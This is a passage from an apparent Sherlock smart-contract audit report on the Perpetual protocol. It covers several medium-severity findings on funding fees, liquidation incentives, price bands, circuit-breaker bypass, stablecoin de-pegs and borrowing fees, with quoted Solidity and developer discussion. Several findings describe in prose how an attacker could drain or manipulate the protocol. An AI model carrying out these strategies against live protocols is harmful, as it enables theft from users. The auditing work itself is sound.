Typically, in most `protocols`, the generated `yields` are totally distributed to users and the `protocol` itself.
In the `Perpetual` protocol, all `borrowing fees` from `payers` are solely distributed to `receivers`, which are whitelisted by the `protocol`.
However, not all `funding fees` are distributed, or there may be a lack of `funding fees` available for distribution.
The current `funding rate` is determined based on the current `position` of the `base pool`(`OracleMaker`).
```solidity
function getCurrentFundingRate(uint256 marketId) public view returns (int256) {
    uint256 fundingRateAbs = FixedPointMathLib.fullMulDiv(
        fundingConfig.fundingFactor,
        FixedPointMathLib
            .powWad(openNotionalAbs.toInt256(), fundingConfig.fundingExponentFactor.toInt256())
            .toUint256(),
        maxCapacity
    );
}
```
Holders of `positions` with the same direction of the `position` of the `OracleMaker` receive `funding fees`, while those with `positions` in the opposite direction are required to pay `funding fees`.
The amount of `funding fees` generated per second is calculated as the product of the `funding rate` and the sum of `openNotionals` of `positions` with the opposite direction.
Conversely, the amount of `funding fees` distributed per second is calculated as the product of the `funding rate` and the sum of `openNotionls` of `positions` with the same direction of the `position` of the `OracleMaker`.
```solidity
function getPendingFee(uint256 marketId, address trader) public view returns (int256) {
    int256 fundingRate = getCurrentFundingRate(marketId);
    int256 fundingGrowthLongIndex = _getFundingFeeStorage().fundingGrowthLongIndexMap[marketId] +
        (fundingRate * int256(block.timestamp - _getFundingFeeStorage().lastUpdatedTimestampMap[marketId]));
    int256 openNotional = _getVault().getOpenNotional(marketId, trader);
    int256 fundingFee = 0;
    if (openNotional != 0) {
        fundingFee = _calcFundingFee(
            openNotional,
            fundingGrowthLongIndex - _getFundingFeeStorage().lastFundingGrowthLongIndexMap[marketId][trader]
        );   // @audit, here
    }
    return fundingFee;
}
```
All `orders` are settled against `makers`, meaning for every `long position`, there should be an equivalent `short position`.
While we might expect the sum of `openNotionals` of `long positions` to be equal to the `openNotionals` of `short positions`, in reality, they may differ.

Suppose there are two `long positions` with `openNotional` values of `S` and `S/2`.
Then there should be two `short positions` with `openNotianal` values of `-S` and `-S/2`.
If the holder of the first `long position` cancels his `order` against the second `short position` with `-S/2`, the `openNotional` of the `long position` becomes `0`, and the second `short position` becomes a `long position`.
However, we can not be certain that the `openNotional` of the new `long position` is exactly `S/2`.
```solidity
function add(Position storage self, int256 positionSizeDelta, int256 openNotionalDelta) internal returns (int256) {
    int256 openNotional = self.openNotional;
    int256 positionSize = self.positionSize;

    bool isLong = positionSizeDelta > 0;
    int256 realizedPnl = 0;

    // new or increase position
    if (positionSize == 0 || (positionSize > 0 && isLong) || (positionSize < 0 && !isLong)) {
        // no old pos size = new position
        // direction is same as old pos = increase position
    } else {
        // openNotionalDelta and oldOpenNotional have different signs = reduce, close or reverse position
        // check if it's reduce or close by comparing absolute position size
        // if reduce
        // realizedPnl = oldOpenNotional * closedRatio + openNotionalDelta
        // closedRatio = positionSizeDeltaAbs / positionSizeAbs
        // if close and increase reverse position
        // realizedPnl = oldOpenNotional + openNotionalDelta * closedPositionSize / positionSizeDelta
        uint256 positionSizeDeltaAbs = positionSizeDelta.abs();
        uint256 positionSizeAbs = positionSize.abs();

        if (positionSizeAbs >= positionSizeDeltaAbs) {
            // reduce or close position
            int256 reducedOpenNotional = (openNotional * positionSizeDeltaAbs.toInt256()) /
                positionSizeAbs.toInt256();
            realizedPnl = reducedOpenNotional + openNotionalDelta;
        } else {
            // open reverse position
            realizedPnl =
                openNotional +
                (openNotionalDelta * positionSizeAbs.toInt256()) /
                positionSizeDeltaAbs.toInt256();
        }
    }

    self.positionSize += positionSizeDelta;
    self.openNotional += openNotionalDelta - realizedPnl;

    return realizedPnl;
}
```
Indeed, the `openNotional` of the new `long position` is determined by the current `price`.
Consequently, while the `position size` of this new `long position` will be the same with the old second `long position` with an `openNotional` value of `S/2`, the `openNotional` of the new `long position` can indeed vary from `S/2`.
As a result, the sum of `openNotionals` of `short positions` can differ from the sum of `long positions`.
There are numerous other scenarios where the sums of `openNotionals` may vary.

I believe that the developers also thought that the `funding fees` are totally used between it's `payers` and `receivers` from the below code.
```solidity
/// @notice positive -> pay funding fee -> fundingFee should round up
/// negative -> receive funding fee -> -fundingFee should round down
function _calcFundingFee(int256 openNotional, int256 deltaGrowthIndex) internal pure returns (int256) {
    if (openNotional * deltaGrowthIndex > 0) {
        return int256(FixedPointMathLib.fullMulDivUp(openNotional.abs(), deltaGrowthIndex.abs(), WAD));
    } else {
        return (openNotional * deltaGrowthIndex) / WAD.toInt256();
    }
}
```
They even took `rounding` into serious consideration to prevent any shortfall of `funding fees` for distribution.
## Impact
Excess `funding fees` in the `PnL pool` can arise when the sum of `openNotionals` of the `payers` exceeds that of the `receivers`.
Conversely, `bad debt` may occur in other cases, leading to a situation where users are unable to receive their `funding fees` due to an insufficient `PnL pool`.
It is worth to note that other `yields`, such as the `borrowing fee`, are entirely utilized between it's `payers` and `receivers`.
Therefore, there are no additional `funding sources` available to address any shortages of `funding fees`.
## Code Snippet
https://github.com/sherlock-audit/2024-02-perpetual/blob/main/perp-contract-v3/src/fundingFee/FundingFee.sol#L133-L139
https://github.com/sherlock-audit/2024-02-perpetual/blob/main/perp-contract-v3/src/fundingFee/FundingFee.sol#L89-L102
https://github.com/sherlock-audit/2024-02-perpetual/blob/main/perp-contract-v3/src/vault/LibPosition.sol#L45-L48
https://github.com/sherlock-audit/2024-02-perpetual/blob/main/perp-contract-v3/src/fundingFee/FundingFee.sol#L183-L191
## Tool used

Manual Review

## Recommendation
We can calculate `funding fees` based on the `position size` because the sum of the `position sizes` of `long positions` will always be equal to the sum of `short positions` in all cases.



## Discussion

**sherlock-admin4**

2 comment(s) were left on this issue during the judging contest.

**santipu_** commented:
> Medium

**takarez** commented:
>  valid; medium(8)



**vinta**

Confirmed, this is valid. Thanks for finding this bug!

We're still figuring out a fix, or we might probably just disable fundingFee entirely if we cannot solve it before launch.

# Issue M-5: Attackers can create positions that have no incentive to be liquidated 

Source: https://github.com/sherlock-audit/2024-02-perpetual-judging/issues/115 

## Found by 
IllIllI
## Summary

There is no incentive to liquidate tiny positions, which may lead to insolvency


## Vulnerability Detail

A well-funded attacker (e.g. a competing exchange) can create millions of positions where each position's total open notional (and thus the liquidation fee given when closing the position) is smaller than the gas cost required to liquidate it if there's a loss.


## Impact

Lots of small losses are equivalent to one large loss, which will lead to bad debt that the exchange will have to cover in order to allow others to withdraw from the PnL pool


## Code Snippet

There is [no](https://github.com/sherlock-audit/2024-02-perpetual/blob/main/perp-contract-v3/src/config/Config.sol) minimum position size, and the liquidation incentive is based on the total open notional (average cost to open):
```solidity
// File: src/clearingHouse/LibLiquidation.sol : LibLiquidation.getPenalty()   #1

73        /// @notice penalty = liquidatedPositionNotionalDelta * liquidationPenaltyRatio, shared by liquidator and protocol
74        /// liquidationFeeToLiquidator = penalty * liquidation fee ratio. the rest to the protocol
75        function getPenalty(
76            MaintenanceMarginProfile memory self,
77            uint256 liquidatedPositionSizeDelta
78        ) internal view returns (uint256, uint256) {
79            // reduced percentage = toBeLiquidated / oldSize
80            // liquidatedPositionNotionalDelta = oldOpenNotional * percentage = oldOpenNotional * toBeLiquidated / oldSize
81            // penalty = liquidatedPositionNotionalDelta * liquidationPenaltyRatio
82            uint256 openNotionalAbs = self.openNotional.abs();
83 @>         uint256 liquidatedNotionalMulWad = openNotionalAbs * liquidatedPositionSizeDelta;
84            uint256 penalty = liquidatedNotionalMulWad.mulWad(self.liquidationPenaltyRatio) / self.positionSize.abs();
85            uint256 liquidationFeeToLiquidator = penalty.mulWad(self.liquidationFeeRatio);
86            uint256 liquidationFeeToProtocol = penalty - liquidationFeeToLiquidator;
87            return (liquidationFeeToLiquidator, liquidationFeeToProtocol);
88:       }
```
https://github.com/sherlock-audit/2024-02-perpetual/blob/main/perp-contract-v3/src/clearingHouse/LibLiquidation.sol#L73-L88

Furthermore, even if somehow gas costs were free, the `mulWad()` used to calculate the penalty/fee rounds _down_ the total penalty as well as the portion that the liquidator gets, so one-wei open notionals will have a penalty payment of zero to the liquidator


## Tool used

Manual Review


## Recommendation

Have a minimum total open notional for positions, to ensure there's a large enough fee to overcome liquidation gas costs. Also round up the fee



## Discussion

**sherlock-admin4**

2 comment(s) were left on this issue during the judging contest.

**santipu_** commented:
> Low - Gas fees on L2s are cheap, now more with Dencun update. An hypothetical attacker should use trillions of different addresses without gaining any profit doing it.

**takarez** commented:
>  POC of such attacked would have helped.



**sherlock-admin4**

The protocol team fixed this issue in PR/commit https://github.com/perpetual-protocol/perp-contract-v3/pull/3.

# Issue M-6: Price band caps apply to decreasing orders, but not to liquidations 

Source: https://github.com/sherlock-audit/2024-02-perpetual-judging/issues/116 

## Found by 
IllIllI
## Summary

Price band caps limit the price at which an order can be settled (e.g. someone trying to reduce their exposure in order to avoid liquidation), but liquidations have no such limitation.


## Vulnerability Detail

Price bands are [used](https://github.com/sherlock-audit/2024-02-perpetual/blob/02f17e70a23da5d71364268ccf7ed9ee7cedf428/perp-contract-v3/test/orderGatewayV2/OrderGatewayV2.settleOrder.int.t.sol#L1269-L1273) in order to ensure that users can't trade a extreme prices, which would result in lower-than usual fees, and liquidations to be less likely, because borrowing fees, funding fees, and liquidation penalties are all based on the opening notional value, rather than the current position size's value, and the reduced fee wouldn't be enough incentive to liquidate the position.

Having price caps means that even if there are two willing parties willing to settle a trade at a market-determined price, they will be prevented from doing so. In traditional financial markets, there are also trading halts when there is extreme price movement. The difference here is that while no trades are allowed during market halts in traditional finance, in the Perpetual system, liquidations are allowed to take place even if users can't close their positions.


## Impact

The whole purpose of the OracleMaker is to be able to provide liquidity at _all_ times, though this liquidity may be available at a disadvantageous price. If there's a price band, anyone who tries to exit their position before they're liquidated (incurring a fee charged on top of losing the position), will have their orders rejected, even at the disadvantageous price. Note that orders interacting with the OracleMaker, and with other non-whitelisted makers (other traders) are executed by Relayers, who are expected to settle orders after a delay, so definitionally, they'll either be using a stale oracle price or will be executing after other traders have had a change to withdraw their liquidity. In either case, during periods of high volatility and liquidations, the price being used will no longer match the market's clearing price.


## Code Snippet

Orders modifying/creating positions have price band checks:
```solidity
// File: src/clearingHouse/ClearingHouse.sol : ClearingHouse._openPosition()   #1

321                if (params.isBaseToQuote) {
322                    // base to exactOutput(quote), B2Q base- quote+
323                    result.base = -oppositeAmount.toInt256();
324                    result.quote = params.amount.toInt256();
325                } else {
326                    // quote to exactOutput(base), Q2B base+ quote-
327                    result.base = params.amount.toInt256();
328                    result.quote = -oppositeAmount.toInt256();
329                }
330            }
331:@>         _checkPriceBand(params.marketId, result.quote.abs().divWad(result.base.abs()));
```
https://github.com/sherlock-audit/2024-02-perpetual/blob/main/perp-contract-v3/src/clearingHouse/ClearingHouse.sol#L321-L331

but liquidations don't have any price caps, and dont have any authorization checks, which means it can be executed without going through the order gateways and their [relayers](https://github.com/sherlock-audit/2024-02-perpetual/blob/main/perp-contract-v3/src/orderGatewayV2/OrderGatewayV2.sol#L161):
```solidity
// File: src/clearingHouse/ClearingHouse.sol : ClearingHouse.params   #2

160        /// @inheritdoc IClearingHouse
161        function liquidate(
162            LiquidatePositionParams calldata params
163:       ) external nonZero(params.positionSize) returns (int256, int256) {
```
https://github.com/sherlock-audit/2024-02-perpetual/blob/main/perp-contract-v3/src/clearingHouse/ClearingHouse.sol#L160-L163


## Tool used

Manual Review


## Recommendation

Don't use the price bands for trades against the OracleMaker. As is shown by some of my other submissions, removing the price bands altogether is not safe.



## Discussion

**sherlock-admin2**

2 comment(s) were left on this issue during the judging contest.

**santipu_** commented:
> Low - Relayers will execute delayed order with the current market price, not a stale one. And the spread price will never be enough to make the price deviate too much to fail the price band check. If it happened, it should be considered an admin mistake. 

**takarez** commented:
>  seem valid; medium(2)



**vinta**

This is invalid I suppose. Indeed, `openPosition()` does have price band but `liquidate()` doesn't. However, liquidation is "liquidator takes over the liquidatable position at Pyth oracle price". So no need to have price band for liquidation I think.

Though I agree that trading with OracleMaker doesn't really need price band, but I guess it won't hurt if we still check price band for OracleMaker. It's simpler on implementation (no extra code to check whether it's trading with OracleMaker).

**IllIllI000**

@vinta This submission is about the fact that a normal user will be unable to reduce their position if the OracleMaker's price is outside the price bands, leading to a liquidation they can't do anything to prevent. Can you elaborate on what part is invalid?

**vinta**

@IllIllI000 But how does OracleMaker's price be outside the price band? Since the price band is based on the oracle price +- xx% and OracleMaker's price is from the same oracle. Liquidation is also using the same oracle price.

**IllIllI000**

@vinta if traders keep hitting the same side of the bid or ask, the OracleMaker quotes a worse and worse price for the next trade. Eventually, the next 'worse price' will be pushed outside of the price bands, even though the pyth/oracle price is still at the midpoint of (within) the price band. The liquidation will be using the midpoint, but a trader wanting to reduce their position by reducing against the OracleMaker will only have access to the 'worse price', which may be outside of the bands and will therefore be rejected

**vinta**

@IllIllI000 You're right, that would be a problem. Yes, this is valid! Thank you for pointing out this.

**sherlock-admin4**

The protocol team fixed this issue in PR/commit https://github.com/perpetual-protocol/perp-contract-v3/pull/17.

# Issue M-7: Withdrawal caps can be bypassed by opening positions against the SpotHedgeBaseMaker 

Source: https://github.com/sherlock-audit/2024-02-perpetual-judging/issues/117 

The protocol has acknowledged this issue.

## Found by 
IllIllI
## Summary

Deposits/withdrawals of base tokens to the SpotHedgeBaseMaker aren't accounted for in the CircuitBreaker's accounting, so the tokens can be used by attackers to increase the amount withdrawable past the high water mark percentage limits.


## Vulnerability Detail

The SpotHedgeBaseMaker allows LPs to deposit base tokens in exchange for shares. The CircuitBreaker doesn't include base tokens in its accounting, until they're converted to quote tokens and added to the vault, which happens when someone opens a short base position, and the SpotHedgeBaseMaker needs to hedge its corresponding long base position, by swapping base tokens for the quote token. The CircuitBreaker keeps track of net deposits/withdrawals of the quote token using a high water mark system, in which the high water mark isn't updated until the sync interval has passed. As long as the _net_ outflow between sync intervals doesn't pass the threshold, withdrawals are allowed.


## Impact

Assume there is some sort of exploit, where the attacker is able to artificially inflate their 'fund' amount (e.g. one of my other submissions), and are looking to withdraw their ill-gotten gains. Normally, the amount they'd be able to withdraw would be limited to X% of the TVL of collateral tokens in the vault. By converting some of their 'fund' to margin, and opening huge short base positions against the SpotHedgeBaseMaker, they can cause the SpotHedgeBaseMaker to swap its contract balance of base tokens into collateral tokens, and deposit them into its vault account, increasing the TVL to TVL+Y. Since the time-based threshold will still be the old TVL, they're now able to withdraw `TVL.old * X% + Y`, rather than just `TVL.old * X%`. Depending on the price band limits set for swaps, the attacker can use a flash loan to temporarily skew the base/quote UniswapV3 exchange rate, such that the swap nets a much larger number of quote tokens than would normally be available to trade for. This means that if the 'fund' amount that the attacker has control over is larger than the actual number of collateral tokens in the vault, the attacker can potentially withdraw 100% of the TVL.


## Code Snippet

Quote tokens acquired via the swap are deposited into the [vault](https://github.com/sherlock-audit/2024-02-perpetual/blob/main/perp-contract-v3/src/maker/SpotHedgeBaseMaker.sol#L571), which passes them through the [CircuitBreaker](https://github.com/sherlock-audit/2024-02-perpetual/blob/main/perp-contract-v3/src/vault/Vault.sol#L339):
```solidity
// File: src/maker/SpotHedgeBaseMaker.sol : SpotHedgeBaseMaker.fillOrder()   #1

415                } else {
416                    quoteTokenAcquired = _formatPerpToSpotQuoteDecimals(amount);
417 @>                 uint256 oppositeAmountXSpotDecimals = _uniswapV3ExactOutput(
418                        UniswapV3ExactOutputParams({
419                            tokenIn: address(_getSpotHedgeBaseMakerStorage().baseToken),
420                            tokenOut: address(_getSpotHedgeBaseMakerStorage().quoteToken),
421                            path: path,
422                            recipient: maker,
423                            amountOut: quoteTokenAcquired,
424                            amountInMaximum: _getSpotHedgeBaseMakerStorage().baseToken.balanceOf(maker)
425                        })
426                    );
427                    oppositeAmount = _formatSpotToPerpBaseDecimals(oppositeAmountXSpotDecimals);
428                    // Currently we don't utilize fillOrderCallback for B2Q swaps,
429                    // but we still populate the arguments anyways.
430                    fillOrderCallbackData.amountXSpotDecimals = quoteTokenAcquired;
431                    fillOrderCallbackData.oppositeAmountXSpotDecimals = oppositeAmountXSpotDecimals;
432                }
433    
434                // Deposit the acquired quote tokens to Vault.
435:@>             _deposit(vault, _marketId, quoteTokenAcquired);
```
https://github.com/sherlock-audit/2024-02-perpetual/blob/main/perp-contract-v3/src/maker/SpotHedgeBaseMaker.sol#L405-L442

The CircuitBreaker only tracks [net liqInPeriod changes](https://github.com/sherlock-audit/2024-02-perpetual/blob/main/perp-contract-v3/src/circuitBreaker/LibLimiter.sol#L39-L49) changes during the withdrawal period, and only triggers the CircuitBreaker based on the TVL older than the withdrawal period:

```solidity
// File: src/circuitBreaker/LibLimiter.sol : LibLimiter.status()   #2

119            int256 currentLiq = limiter.liqTotal;
...
126 @>         int256 futureLiq = currentLiq + limiter.liqInPeriod;
127            // NOTE: uint256 to int256 conversion here is safe
128            int256 minLiq = (currentLiq * int256(limiter.minLiqRetainedBps)) / int256(BPS_DENOMINATOR);
129    
130 @>         return futureLiq < minLiq ? LimitStatus.Triggered : LimitStatus.Ok;
131:       }
```
https://github.com/sherlock-audit/2024-02-perpetual/blob/main/perp-contract-v3/src/circuitBreaker/LibLimiter.sol#L119-L131


## Tool used

Manual Review


## Recommendation

Calculate the quote-token value of each base token during LP `deposit()`/`withdraw()`, and add those amounts as CircuitBreaker flows during `deposit()`/`withdraw()`, then also invert those flows prior to depositing into/withdrawing from the vault



## Discussion

**sherlock-admin3**

1 comment(s) were left on this issue during the judging contest.

**santipu_** commented:
> Medium/Low - Attacker would have to open a big short position against SpotHedgeBaseMaker during some time, exposing itself to losses due to price changes



**tailingchen**

Valid but won't fix.

Although circuit breaker can be bypassed, it still depends on the liquidity of SpotHedgeBaseMaker and the price band.
The team prefers not to fix it in the early stages. 

If the team want to fix it in the future, we have discussed several possible solutions. These solutions all have some pros and cons. The team is still evaluating possible options.
1. Separately calculate inflows and outflows for the same period. Only previous TVL is taken.
2. Do not include whitelisted maker’s deposit into TVL calculations.
3. Let SHBM check the current rate limit status of CircuitBreaker before depositing collateral into the vault. If the remaining balance that can be withdrawn is too small, it means that the current vault risk is too high and there is a risk that it cannot be withdrawn. Therefore, SHBM can refuse this position opening.

# Issue M-8: SpotHedgeBaseMaker LPs will be able to extract value during a USDT/USDC de-peg 

Source: https://github.com/sherlock-audit/2024-02-perpetual-judging/issues/118 

The protocol has acknowledged this issue.

## Found by 
IllIllI, PUSH0, ge6a
## Summary

The Perpetual protocol only supports USDT as collateral, but prices everything as though USDT were always equal to 1-for-1. Ongoing [small de-pegs](https://coinmarketcap.com/currencies/tether/) will only leave small amounts for arbitrage, because any arbitrage in size will skew the OracleMaker and UniswapV3 pools' prices to account for the opportunity. One case that cannot be handled is a large de-peg when the SpotHedgeBaseMaker has a lot of base tokens available.


## Vulnerability Detail

The protocol's contest [readme](https://github.com/sherlock-audit/2024-02-perpetual/blob/02f17e70a23da5d71364268ccf7ed9ee7cedf428/README.md?plain=1#L15) says that either USDT or USDC will be used as collateral, and the project [documentation](https://perp.notion.site/PythOraclePool-e99a88be051f4bc8be0b1310eb982cd4) says that it will use Pyth oracles for pricing base tokens. Pyth only has a single oracle for USDT and USDC [each](https://pyth.network/developers/price-feed-ids), which is their USD value. All other Pyth oracles are for the USD price, not the USDT or USDC price.

In the case of the SpotHedgeBaseMaker, when a user wishes to withdraw their base tokens, it calculates the total value of all of the LP shares, as the [value](https://github.com/sherlock-audit/2024-02-perpetual/blob/main/perp-contract-v3/src/maker/SpotHedgeBaseMaker.sol#L734-L743) of the vault account plus the net base tokens contributed during all deposit()s/withdraw()s. The price that it uses to convert the value of the vault in the vault's collateral, into the value of the vault in the base token's units, is the &lt;base>/USD price, not a &lt;base>/USDT or &lt;base>/USDC price (because there isn't an oracle for that).


## Impact

If USDT is the collateral token and de-pegs by 30%, instead of valuing the account's collateral at 70% of what was deposited, it keeps it at 100%, letting each LP share withdraw more funds than it should be able to. Only base tokens can be withdrawn, so the first LPs to withdraw during the de-peg will get more than they should, leaving less for all others.

A similar issue exists with all markets whose SpotHedgeBaseMaker's LP deposit/withdraw tokens are wrapped/bridged tokens, vs the actual token itself (e.g. WETH vs ETH). The price the SpotHedgeBaseMaker uses is the price returned by the oracle for the market, which is the actual token's oracle, not the hedging token's oracle. If there is a de-peg there (e.g. because the wrapped token is considered by some jurisdictions as a 'security', whereas the underlying isn't), then the amount of tokens deposited will be over-valued, and at the end when the market is wound down, profits not covered by the deposited hedging tokens will be withdrawable as the collateral token, which will have been over-valued at the expense of the other LPs.


## Code Snippet

The function to calculate the vault value in units of the base token, takes in a price...:
```solidity
// File: src/maker/SpotHedgeBaseMaker.sol : SpotHedgeBaseMaker.withdraw()   #1

311            uint256 redeemedRatio = shares.divWad(totalSupply()); // in ratio decimals 18
...
320            uint256 price = _getPrice();
321 @>         uint256 vaultValueInBase = _getVaultValueInBaseSafe(vault, price);
322            uint256 withdrawnBaseAmount = vaultValueInBase.mulWad(redeemedRatio).formatDecimals(
323                INTERNAL_DECIMALS,
324                _getSpotHedgeBaseMakerStorage().baseTokenDecimals
325:           );
```
https://github.com/sherlock-audit/2024-02-perpetual/blob/main/perp-contract-v3/src/maker/SpotHedgeBaseMaker.sol#L311-L325

...which refers to the market's oracle's price:
```solidity
// File: src/maker/SpotHedgeBaseMaker.sol : SpotHedgeBaseMaker.price   #2

769        function _getPrice() internal view returns (uint256) {
770            IAddressManager addressManager = getAddressManager();
771 @>         (uint256 price, ) = addressManager.getPythOracleAdapter().getPrice(
772                addressManager.getConfig().getPriceFeedId(_getSpotHedgeBaseMakerStorage().marketId)
773            );
774            return price;
775:       }
```
https://github.com/sherlock-audit/2024-02-perpetual/blob/main/perp-contract-v3/src/maker/SpotHedgeBaseMaker.sol#L769-L775

which is the price returned from the [pyth](https://github.com/sherlock-audit/2024-02-perpetual/blob/main/perp-contract-v3/src/oracle/pythOracleAdapter/PythOracleAdapter.sol#L80-L83) contract (converted for decimals), which is a USD price.


## Tool used

Manual Review


## Recommendation

Use the &lt;quote-token>/USD oracle to convert the &lt;base-token>/USD price to a &lt;base-token>/&lt;quote-token> oracle



## Discussion

**sherlock-admin4**

2 comment(s) were left on this issue during the judging contest.

**santipu_** commented:
> Medium

**takarez** commented:
>  the ReadMe says "Oracle (Pyth) is expected to accurately report the price of market" which kinda mean that the pyth is trusted and realiable



# Issue M-9: Borrow fees can be arbitrarily increased without the maker providing any value 

Source: https://github.com/sherlock-audit/2024-02-perpetual-judging/issues/126 

The protocol has acknowledged this issue.

## Found by 
IllIllI, PUSH0
## Summary

The SpotHedgeBaseMaker LPs can maximize their LP returns by closing their trades against other whitelisted makers


## Vulnerability Detail

The [whitelisted makers](https://perp.notion.site/Borrowing-Fee-Spec-v0-8-0-22ade259889b4c30b59762d582b4336d), which the SpotHedgeBaseMaker and the OracleMaker are, `[c]an receive borrowing fee based on [their] utilization ratio` and `[d]on’t need to pay borrowing fee` themselves. The borrowing fee is meant to be compensation for providing liquidity to the market, but makers like the SpotHedgeBaseMaker, which are able to hedge their position risk, can arbitrarily increase their utilization ratio by opening positions against the OracleMaker, and immediately closing them against the SpotHedgeBaseMaker, maximizing their fees without having to provide liquidity over time.

An attacker can choose a specific market direction, then monitor the utilization of the OracleMaker. Any time the OracleMaker's utilization is flat, the attacker would open a position in the chosen market direction against the OracleMaker (to minimize the dynamic premium), then immediately close the position by offsetting it with a taker order against the SpotHedgeBaseMaker. The only risk the attacker has to take is holding the position for the approximately ~2 second optimism block time, until they're able to offset the position using the ClearingHouse to interact directly with the SpotHedgeBaseMaker.

## Impact

Value extraction in the form of excessive fees, at the expense of traders on the other side of the chosen position direction.


## Code Snippet

Utilization does not take into account whether the taker is reducing their position, only that the maker is increasing theirs:
```solidity
// File: src/borrowingFee/LibBorrowingFee.sol : LibBorrowingFee.updateReceiverUtilRatio()   #1

40            /// spec: global_ratio = sum(local_ratio * local_open_notional) / total_receiver_open_notional
41            /// define factor = local_ratio * local_open_notional; global_ratio = sum(factor) / total_receiver_open_notional
42            /// we only know 1 local diff at a time, thus splitting factor to known_factor and other_factors
43            /// a. old_global_ratio = (old_factor + sum(other_factors)) / old_total_open_notional
44            /// b. new_global_ratio = (new_factor + sum(other_factors)) / new_total_open_notional
45            /// every numbers are known except new_global_ratio. sum(other_factors) remains the same between old and new
46            /// expansion formula a: sum(other_factors) = old_global_ratio * old_total_open_notional - old_factor
47            /// replace sum(other_factors) in formula b:
48            /// new_global_ratio = (new_factor + old_global_ratio * old_total_open_notional - old_factor) / new_total_open_notional
49            uint256 oldUtilRatioFactor = self.utilRatioFactorMap[receiver];
50 @>         uint256 newTotalReceiverOpenNotional = self.totalReceiverOpenNotional;
51            uint256 oldUtilRatio = self.utilRatio;
52            uint256 newUtilRatio = 0;
53            if (newTotalReceiverOpenNotional > 0) {
54                // round up the result to prevent from subtraction underflow in next calculation
55 @>             newUtilRatio = FixedPointMathLib.divUp(
56                    oldUtilRatio * self.lastTotalReceiverOpenNotional + newUtilRatioFactor - oldUtilRatioFactor,
57                    newTotalReceiverOpenNotional
58                );
59:           }   
```
https://github.com/sherlock-audit/2024-02-perpetual/blob/main/perp-contract-v3/src/borrowingFee/LibBorrowingFee.sol#L40-L59

and [whitelisted makers](https://github.com/sherlock-audit/2024-02-perpetual/blob/main/perp-contract-v3/src/borrowingFee/BorrowingFee.sol#L299-L303) never have to pay any fee:
```solidity
// File: src/borrowingFee/BorrowingFee.sol : BorrowingFee.getPendingFee()   #2

165        function getPendingFee(uint256 marketId, address trader) external view override returns (int256) {
166 @>         if (_isReceiver(marketId, trader)) {
167                return _getPendingReceiverFee(marketId, trader);
168            }
169            return _getPendingPayerFee(marketId, trader);
170:       }
```
https://github.com/sherlock-audit/2024-02-perpetual/blob/main/perp-contract-v3/src/borrowingFee/BorrowingFee.sol#L165-L170


## Tool used

Manual Review


## Recommendation

There is no incentive to reduce utilization, and I don't see a good solution that doesn't involve the makers having to actively re-balance their positions, e.g. force makers to also have to pay the fee, and only pay the fee to the side that has the largest net non-maker open opposite position




## Discussion

**sherlock-admin2**

1 comment(s) were left on this issue during the judging contest.

**santipu_** commented:
> Medium/Low - Attacker's position may be closed with some losses due to slippage closing the position against SpotHedgeBaseMaker



**42bchen**

By doing this, the attacker will risk losing money because he needs to relay the position to our relayer, and he can't guarantee that this operation is profitable. Also, arbitrage between maker and maker is expected in our system.

**IllIllI000**

@42bchen the position only has to be open for one block so the position risk is small. The attacker gains value from the LP borrow fees over time that accrue well past the point at which they close the trade, not from the position itself. Every user on one side is affected by the higher fees, so even if the whole trade is a loss for the attacker, they've still gotten all other users to pay higher fees, which is a loss of funds for them. Also, [this](https://github.com/sherlock-audit/2024-02-perpetual-judging/issues/133) one was marked as a valid high, and has the same gap risk

**42bchen**

> @42bchen the position only has to be open for one block so the position risk is small. The attacker gains value from the LP borrow fees over time that accrue well past the point at which they close the trade, not from the position itself. Every user on one side is affected by the higher fees, so even if the whole trade is a loss for the attacker, they've still gotten all other users to pay higher fees, which is a loss of funds for them. Also, [this](https://github.com/sherlock-audit/2024-02-perpetual-judging/issues/133) one was marked as a valid high, and has the same gap risk

update to confirmed, and we think using whitelistLp (only us) can decrease the incentive of attackers to do that, not yet figured out a better way (or easy way) to handle this issue, if you have any suggestions for solving this, please let us know, thank you 🙏

# Issue M-10: Whale LPs can make the admin's risk control parameters ineffective 

Source: https://github.com/sherlock-audit/2024-02-perpetual-judging/issues/127 

The protocol has acknowledged this issue.

## Found by 
IllIllI
## Summary

Unlike other exchanges where the funding fee is used to incentivize the perpetual price to match the spot price, the Perpetual exchange always offers the spot price, and uses the funding fee to balance the much smaller OracleMaker's position exposure. Because the OracleMaker's position is much smaller than the exchange as a whole's position balance, it's much easier to manipulate than a normal exchange, and therefore will require more frequent changes to funding-related parameters controlled by the admin. The funding fee rate depends not only on admin-controlled parameters, but with the amount of LP funds available, which is under the control of the LPs.


## Vulnerability Detail

As the setup for the attack, a well-funded attacker (e.g. a competing exchange) can use sock puppets to add LP liquidity to the OracleMaker. When the funding rate needs to be modified (e.g. because the attacker decides to spend funds to drastically skew the OracleMaker's position balance), after the admin makes the change, the attacker can magnify the effect of the parameter by withdrawing the LP liquidity, or they can mute it by adding a lot of liquidity. Because the circuitbreaker nets in-flows against out-flows, the attacker can prevent hitting the limit by depositing margin to an arbitrary position, prior to calling `withdraw()` on the OracleMaker.


## Impact

Traders expecting to be paid a funding fee for taking their positions, can suddenly find themselves having to _pay_, at the maximum rate. Customers will not use an exchange where the funding fee suddenly flips, and can't be reliably hedged/arbitraged against another exchange's funding fee.


## Code Snippet

The factor and exponent set by the admin are modulated by the capacity, which is based on the maximum leverage available, given the total amount deposited by the LPs:
```solidity
// File: src/fundingFee/FundingFee.sol : FundingFee.getCurrentFundingRate()   #1

123            uint256 totalDepositedAmount = uint256(_getVault().getSettledMargin(marketId, fundingConfig.basePool));
124            uint256 maxCapacity = FixedPointMathLib.divWad(
125 @>             totalDepositedAmount,
126                uint256(OracleMaker(fundingConfig.basePool).minMarginRatio())
127            );
128    
129            // maxCapacity = basePool.totalDepositedAmount / basePool.minMarginRatio
130            // imbalanceRatio = basePool.openNotional^fundingExponentFactor / maxCapacity
131            // fundingRate = fundingFactor * imbalanceRatio
132            // funding = trader.openNotional * fundingRate * deltaTimeInSeconds
133            uint256 fundingRateAbs = FixedPointMathLib.fullMulDiv(
134 @>             fundingConfig.fundingFactor,
135                FixedPointMathLib
136 @>                 .powWad(openNotionalAbs.toInt256(), fundingConfig.fundingExponentFactor.toInt256())
137                    .toUint256(),
138 @>             maxCapacity
139:           );
```
https://github.com/sherlock-audit/2024-02-perpetual/blob/main/perp-contract-v3/src/fundingFee/FundingFee.sol#L123-L139


## Tool used

Manual Review


## Recommendation

Rate-limit or time-lock changes to the OracleMaker's LP levels



## Discussion

**sherlock-admin3**

2 comment(s) were left on this issue during the judging contest.

**santipu_** commented:
> Medium

**takarez** commented:
